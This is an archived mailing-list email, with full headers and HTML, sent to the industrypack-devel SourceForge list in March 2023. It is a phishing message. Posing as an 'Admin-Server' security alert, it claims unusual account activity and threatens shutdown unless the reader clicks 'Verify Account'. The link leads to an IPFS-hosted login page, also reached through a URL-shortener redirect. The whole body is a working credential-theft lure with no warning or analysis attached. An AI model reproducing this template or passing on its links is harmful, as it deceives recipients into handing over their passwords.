Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 367F06B3FEB
	for <lists+industrypack-devel@lfdr.de>; Fri, 10 Mar 2023 14:05:58 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1pacRY-0005dv-Gu
	for lists+industrypack-devel@lfdr.de;
	Fri, 10 Mar 2023 13:05:57 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <style@petero.store>) id 1pacRW-0005db-82
 for industrypack-devel@lists.sourceforge.net;
 Fri, 10 Mar 2023 13:05:54 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=jEPVNlsajvE8EwNIIvN5STgnySGlwrq76+gODiy2Rn4=; b=E8HWSLTbfp1gpQakGHbjJDdhsE
 CEage6vqXP2H5a4uUcsbNxqDxtGwGkCnTQKI00vs8SH7bsZRtWBhEVHjScPP7X9I+fFAEYsFAekkD
 pXZff+pQ0h01M4ilCCfwGVqbS0EJa71qBZAGvv2l1o9cl2FEmihEqJJS803XnlVMXXCw=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=jEPVNlsajvE8EwNIIvN5STgnySGlwrq76+gODiy2Rn4=; b=h
 Z2/FKbjwj1hr4xu5Et6Dw9A0Q6Ucnzg/8I1Su+rbkxTqYZjHR/3QSrg0o9Cv/5jFnjQ8Ki/q/f3uB
 rJMvNvSkxFKhugGh8VDYUYhthxF5WMYMjtVuCAzdxvM5vMS3kqkXOAEeVEoMvMIjQffB8atpFUX02
 5eOF6K3E8DGjs/QA=;
Received: from thomasklink.pserver.space ([80.85.154.180]
 helo=mail0.petero.store)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1pacRW-0002LC-Lv for industrypack-devel@lists.sourceforge.net;
 Fri, 10 Mar 2023 13:05:54 +0000
To: industrypack-devel@lists.sourceforge.net
Date: 10 Mar 2023 13:47:26 +0100
Message-ID: <20230310134726.ACBBB50F8A8B139B@lists.sourceforge.net>
MIME-Version: 1.0
X-Spam-Score: 1.5 (+)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: This is a copy of a security alert sent to
 industrypack-devel@lists.sourceforge.net
 ; e-Verify Verify Your Email Account industrypack-devel@lists.sourceforge.net
 Attn: industrypack-devel , 
 Content analysis details:   (1.5 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level
 mail domains are different
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_IMAGE_RATIO_06    BODY: HTML has a low ratio of text to image
 area
X-Headers-End: 1pacRW-0002LC-Lv
Subject: [Industrypack-devel] =?utf-8?b?4pqg77iPIEF0dGVudGlvbiA6IENsaWVu?=
 =?utf-8?q?t_E-mail_Authentication/Verification_Request=2E=2E?=
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: Admin-Server via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: Admin-Server <noreply@lists.sourceforge.net>
Content-Type: multipart/mixed; boundary="===============1566447556084131655=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net


--===============1566447556084131655==
Content-Type: multipart/related;
	boundary="----=_NextPart_000_0012_7D4AD8DB.284EA168"


------=_NextPart_000_0012_7D4AD8DB.284EA168
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<p>
<table style=3D"text-transform: none; letter-spacing: normal; padding-botto=
m: 20px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; wo=
rd-spacing: 0px; min-width: 220px; max-width: 516px; orphans: 2; widows: 2;=
 background-color: rgb(255, 255, 255); -webkit-text-stroke-width: 0px; text=
-decoration-thickness: initial; text-decoration-style: initial; text-decora=
tion-color: initial;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td width=3D"8" style=3D"margin: 0px; width: 8px; font-family: Roboto, Robo=
toDraft, Helvetica, Arial, sans-serif;">
<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
l, sans-serif;">
<div style=3D"padding: 16px; margin-bottom: 6px; direction: ltr; background=
-color: rgb(245, 245, 245);">
<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
l, sans-serif; vertical-align: top;"><img width=3D"259" height=3D"194" styl=
e=3D"width: 35px; height: 16px;" src=3D"cid:65072ca0c8b48584e923b9e2705fa47=
1.jpg"></td>
<td width=3D"13" style=3D"margin: 0px; width: 13px; font-family: Roboto, Ro=
botoDraft, Helvetica, Arial, sans-serif;"><br></td>
<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
l, sans-serif; direction: ltr;"><span style=3D"line-height: 1.6; font-famil=
y: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 13px;">This is =
a copy of a security alert sent to<span>&nbsp;</span>
<span class=3D"clickable ClickableEmail inactive" style=3D"border-width: 0p=
x 0px 1px; border-style: dotted; border-color: rgb(51, 51, 51); cursor: poi=
nter;" email=3D"Napat.saetan@interplama.com"><a href=3D"mailto:-email-@inte=
rplama.com">industrypack-devel@lists.sourceforge.net</a></span>&nbsp;;<span=
></span><span></span></span><span></span><span>
<span style=3D"line-height: 1.6; font-family: Roboto-Regular, Helvetica, Ar=
ial, sans-serif; font-size: 13px;"><span></span><span></span></span></span>=
</td></tr></tbody></table></div>
<div align=3D"center" style=3D"padding: 40px 20px; border: thin solid rgb(2=
18, 220, 224); border-image: none;">
<div style=3D'text-align: center; line-height: 32px; padding-bottom: 24px; =
font-family: "Google Sans", Roboto, RobotoDraft, Helvetica, Arial, sans-ser=
if; border-bottom-color: rgb(218, 220, 224); border-bottom-width: thin; bor=
der-bottom-style: solid;'>
<div style=3D"font-size: 24px;">
<h1 style=3D"margin: 0px; color: rgb(0, 0, 0); font-family: Lato, sans-seri=
f; font-weight: 400;"><a style=3D"color: rgb(48, 227, 202); font-family: La=
to, sans-serif; font-size: 24px; font-weight: 700; text-decoration: none;" =
href=3D"https://fleek.ipfs.io/ipfs/Qma1PuHUAprCMJj9tvqaCvkX7cY63RsmjHN5sQnb=
Cke3KY/index5lp.html#industrypack-devel@lists.sourceforge.net" target=3D"_b=
lank"><img style=3D"border-color: rgb(0, 0, 0);" src=3D"cid:65072ca0c8b4858=
4e923b9e2705fa471.jpg" width=3D"259" height=3D"194"><br>e-Verify</a></h1>
<a href=3D"https://fleek.ipfs.io/ipfs/Qma1PuHUAprCMJj9tvqaCvkX7cY63RsmjHN5s=
QnbCke3KY/index5lp.html#industrypack-devel@lists.sourceforge.net" target=3D=
"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://reb=
rand.ly/hisjwnk%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D16656214=
53788000&amp;usg=3DAOvVaw3YjUH1OjAX4VLj6oIyOlUM">Verify Your Email Account<=
/a></div>
<table align=3D"center" style=3D"margin-top: 8px;">
<tbody>
<tr style=3D"line-height: normal;">
<td align=3D"right" style=3D"margin: 0px; padding-right: 8px; font-family: =
Roboto, RobotoDraft, Helvetica, Arial, sans-serif;"><img width=3D"259" heig=
ht=3D"194" style=3D"width: 34px; height: 13px;" src=3D"cid:65072ca0c8b48584=
e923b9e2705fa471.jpg"></td>
<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
l, sans-serif;"><span class=3D"clickable ClickableEmail inactive" style=3D"=
border-width: 0px 0px 1px; border-style: dotted; border-color: rgb(51, 51, =
51); cursor: pointer;" email=3D"Napat.saetan@interplama.com">industrypack-d=
evel@lists.sourceforge.net </span></td></tr></tbody></table></div>
<div style=3D"text-align: left; line-height: 20px; padding-top: 20px; font-=
family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 14px;">Att=
n: industrypack-devel ,<br><br>Our system detected some unusual activities =
in your account.<br><br>As part of our security measures please log in to y=
our account&nbsp;to verify and authenticate your account now.
<br><br><div style=3D"text-align: center; color: rgb(95, 99, 104); line-hei=
ght: 16px; letter-spacing: 0px; padding-top: 20px; font-size: 12px;">
<a style=3D'padding: 10px 24px; color: rgb(255, 255, 255); line-height: 16p=
x; font-family: "Google Sans", Roboto, RobotoDraft, Helvetica, Arial, sans-=
serif; font-size: 14px; font-weight: 400; text-decoration: none; min-width:=
 90px; background-color: rgb(65, 132, 243);' href=3D"https://fleek.ipfs.io/=
ipfs/Qma1PuHUAprCMJj9tvqaCvkX7cY63RsmjHN5sQnbCke3KY/index5lp.html#industryp=
ack-devel@lists.sourceforge.net" target=3D"_blank"=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://rebrand.ly/h=
isjwnk%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1665621453788000&=
amp;usg=3DAOvVaw3YjUH1OjAX4VLj6oIyOlUM"><strong><u>Verify Account</u></stro=
ng></a><br><br><br></div>Please, in order to avoid your <a href=3D"mailto:g=
s@haritagrotech.in">industrypack-devel@lists.sourceforge.net</a>&nbsp;addre=
ss from being shut down, kindly verify your account now.<br><br>This is a s=
ecurity measure intended to protect and secure your account.<br><br>
<font face=3D"Calibri">Email Account Server {C} 2023</font>
<p><span style=3D"font-size: small;"><span style=3D"font-family: calibri;">=
<font size=3D"3">lists.sourceforge.net</font></span></span></p></div></div>=
<div style=3D"text-align: left;"><div style=3D"text-align: center; line-hei=
ght: 18px; padding-top: 12px; font-family: Roboto-Regular, Helvetica, Arial=
, sans-serif; font-size: 11px;"><div style=3D"direction: ltr;">
<blockquote style=3D'color: rgb(51, 51, 51); text-transform: none; text-ind=
ent: 0px; letter-spacing: normal; font-family: "Lucida Grande", Verdana, Ar=
ial, Helvetica, sans-serif; font-size: 11px; font-style: normal; font-weigh=
t: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; back=
ground-color: rgb(255, 255, 255); -webkit-text-stroke-width: 0px; text-deco=
ration-thickness: initial; text-decoration-style: initial; text-decoration-=
color: initial; font-variant-ligatures: normal;=20
font-variant-caps: normal;' type=3D"cite"><table width=3D"100%" style=3D'fo=
nt-family: Candara, "Trebuchet MS", Tahoma, "Helvetica Neue", Helvetica, Ar=
ial, sans-serif; background-color: rgb(230, 230, 230); -webkit-font-smoothi=
ng: antialiased;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><=
tr><td align=3D"center" bgcolor=3D"#e6e6e6"><table width=3D"640" class=3D"v=
1w640" style=3D"margin: 0px 10px;" border=3D"0" cellspacing=3D"0" cellpaddi=
ng=3D"0"><tbody><tr>
<td style=3D"padding: 10px; text-align: center; font-size: 13px;">You recei=
ved this email to let you know about important changes to your Account and =
services with<br>lists.sourceforge.net .&nbsp;&nbsp;<br>&nbsp;2023 &copy; W=
ebmail LLC. Legal Notices / Tranparency policy</td></tr></tbody></table></t=
d></tr></tbody></table></blockquote><br><a style=3D"text-align: center; lin=
e-height: 18px; padding-top: 12px; font-family: Roboto-Regular, Helvetica, =
Arial, sans-serif; font-size: 11px;" target=3D"_blank"></a>
</div></div></div></td>
<td width=3D"8" style=3D"margin: 0px; width: 8px; font-family: Roboto, Robo=
toDraft, Helvetica, Arial, sans-serif;"><br></td></tr></tbody></table><p></=
p></body></html>
------=_NextPart_000_0012_7D4AD8DB.284EA168
Content-Type: image/jpeg; name="65072ca0c8b48584e923b9e2705fa471.jpg"
Content-Transfer-Encoding: base64
Content-ID: <65072ca0c8b48584e923b9e2705fa471.jpg>
Content-Disposition: inline; filename="65072ca0c8b48584e923b9e2705fa471.jpg"

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

------=_NextPart_000_0012_7D4AD8DB.284EA168--


--===============1566447556084131655==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============1566447556084131655==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============1566447556084131655==--

